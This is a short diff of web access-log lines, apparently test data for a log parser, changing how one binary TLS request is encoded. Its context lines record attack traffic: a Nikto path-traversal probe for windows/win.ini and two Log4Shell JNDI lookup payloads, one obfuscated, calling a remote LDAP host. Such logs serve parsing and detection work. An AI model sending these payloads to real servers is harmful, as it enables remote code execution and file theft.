@@ -80,5 +80,5 @@
 192.0.2.99 - - [22/Nov/2026:15:08:23 +0000] "GET /download?file=..%2F..%2F..%2Fwindows%2Fwin.ini HTTP/1.1" 400 300 "-" "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)"
 203.0.113.200 - - [22/Nov/2026:15:09:10 +0000] "GET / HTTP/1.1" 200 5120 "-" "${jndi:ldap://198.51.100.250:1389/Exploit}"
 203.0.113.200 - - [22/Nov/2026:15:09:12 +0000] "GET /?q=%24%7B%24%7Blower:j%7Dndi:ldap://198.51.100.250:1389/b%7D HTTP/1.1" 200 5120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36"
-198.51.100.99 - - [22/Nov/2026:15:10:00 +0000] " ¥  " 400 157 "-" "-"
+198.51.100.99 - - [22/Nov/2026:15:10:00 +0000] "\x16\x03\x01\x00\xa5\x01\x00\x00" 400 157 "-" "-"
 this line is not an access log entry
